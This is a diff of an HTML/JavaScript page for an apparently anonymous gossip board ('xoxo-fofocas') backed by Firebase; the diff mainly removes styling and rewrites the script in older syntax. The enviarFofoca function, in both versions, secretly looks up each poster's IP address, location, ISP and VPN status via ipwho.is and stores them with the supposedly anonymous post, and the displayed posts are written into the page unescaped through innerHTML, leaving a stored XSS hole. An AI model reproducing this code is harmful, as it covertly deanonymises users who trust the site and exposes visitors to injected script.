@@ -10,15 +10,7 @@
 
     <style>
         :root {
-            --fog-gray: #b0b0b0;
-            --dark-gray: #2c2c2c;
             --deep-black: #050505;
-        }
-
-        @keyframes neblina-movimento {
-          0% { background-position: 0% 50%; opacity: 0.8; }
-          50% { background-position: 100% 50%; opacity: 1; }
-          100% { background-position: 0% 50%; opacity: 0.8; }
         }
 
         body {
@@ -39,27 +31,13 @@
             justify-content: center;
             align-items: center;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.1), rgba(0,0,0,0.1));
-            background-size: 400% 400%;
-            animation: neblina-movimento 15s ease infinite;
-            pointer-events: none;
         }
 
         .hero h1 {
             font-size: 5rem;
             margin: 0;
             color: #ccc;
-            font-weight: 900;
             letter-spacing: 12px;
-            text-shadow: 0 0 15px rgba(200, 200, 200, 0.4);
         }
 
         #login-screen {
@@ -73,7 +51,6 @@
             background: #333;
             color: white;
             padding: 15px 30px;
-            border-radius: 2px;
             cursor: pointer;
             border: 1px solid #555;
             text-transform: uppercase;
@@ -138,7 +115,7 @@
 
     <script>
         // Configuração do seu Firebase
-        const firebaseConfig = {
+        var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
             projectId: "xoxo-fofocas",
@@ -148,9 +125,9 @@
             measurementId: "G-3DZPC3E7SV"
         };
 
-        // Inicializa o Firebase
+        // Inicialização estilo Versão Antiga
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        var db = firebase.firestore();
 
         function fakeLogin() {
             document.getElementById('login-screen').style.display = 'none';
@@ -158,66 +135,58 @@
             carregarFofocas();
         }
 
-        async function enviarFofoca() {
-            const inputElement = document.getElementById('fofocaInput');
-            const texto = inputElement.value;
+        function enviarFofoca() {
+            var inputElement = document.getElementById('fofocaInput');
+            var texto = inputElement.value;
             if(texto.trim() === "") return;
 
-            let rastroDigital = {};
+            // Busca o IP e dados técnicos antes de salvar
+            fetch('https://ipwho.is/')
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    var rastro = {
+                        ip: data.ip || "Não detectado",
+                        localizacao: (data.city || "?") + ", " + (data.region || "?"),
+                        provedor: data.connection ? data.connection.isp : "Desconhecido",
+                        e_vpn: data.security ? data.security.vpn : false
+                    };
 
-            try {
-                // Captura de IP e dados técnicos usando crases corretas
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
-                
-                rastroDigital = {
-                    ip: data.ip || "Não detectado",
-                    localizacao: ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'},
-                    provedor: data.connection ? data.connection.isp : "Desconhecido",
-                    e_vpn: data.security ? data.security.vpn : false,
-                    latitude: data.latitude || 0,
-                    longitude: data.longitude || 0
-                };
-            } catch (e) {
-                rastroDigital = { erro: "Falha ao rastrear" };
-            }
-
-            // Gravação no Firestore
-            db.collection("fofocas").add({
-                conteudo: texto,
-                data: firebase.firestore.FieldValue.serverTimestamp(),
-                rastro: rastroDigital,
-                dispositivo: {
-                    plataforma: navigator.platform,
-                    navegador: navigator.userAgent
-                }
-            })
-            .then(() => {
-                inputElement.value = "";
-                alert("Segredo enviado!");
-            })
-            .catch((error) => {
-                console.error("Erro no envio:", error);
-                alert("Erro ao enviar! Verifique se o banco está em 'Modo de Teste'.");
-            });
+                    // Gravação no Firestore (Comando Versão Antiga)
+                    db.collection("fofocas").add({
+                        conteudo: texto,
+                        data: firebase.firestore.FieldValue.serverTimestamp(),
+                        rastro: rastro,
+                        dispositivo: navigator.userAgent
+                    })
+                    .then(function() {
+                        inputElement.value = "";
+                        alert("Segredo enviado!");
+                    })
+                    .catch(function(error) {
+                        alert("Erro ao enviar!");
+                    });
+                })
+                .catch(function(err) {
+                    console.log("Erro no rastreio, enviando apenas o texto.");
+                    db.collection("fofocas").add({
+                        conteudo: texto,
+                        data: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                });
         }
 
         function carregarFofocas() {
             db.collection("fofocas").orderBy("data", "desc")
-            .onSnapshot((snapshot) => {
-                const mural = document.getElementById('mural');
+            .onSnapshot(function(snapshot) {
+                var mural = document.getElementById('mural');
                 mural.innerHTML = "";
-                snapshot.forEach((doc) => {
-                    const fofoca = doc.data();
-                    mural.innerHTML += `
-                        <div class="fofoca-card">
-                            <small style="color: #444;">📢 Um segredo sussurrado...</small>
-                            <p style="color: #999;">${fofoca.conteudo}</p>
-                        </div>
-                    `;
+                snapshot.forEach(function(doc) {
+                    var fofoca = doc.data();
+                    mural.innerHTML += '<div class="fofoca-card">' +
+                        '<small style="color: #444;">📢 Um segredo sussurrado...</small>' +
+                        '<p style="color: #999;">' + fofoca.conteudo + '</p>' +
+                    '</div>';
                 });
-            }, (error) => {
-                console.error("Erro ao carregar fofocas:", error);
             });
         }
     </script>
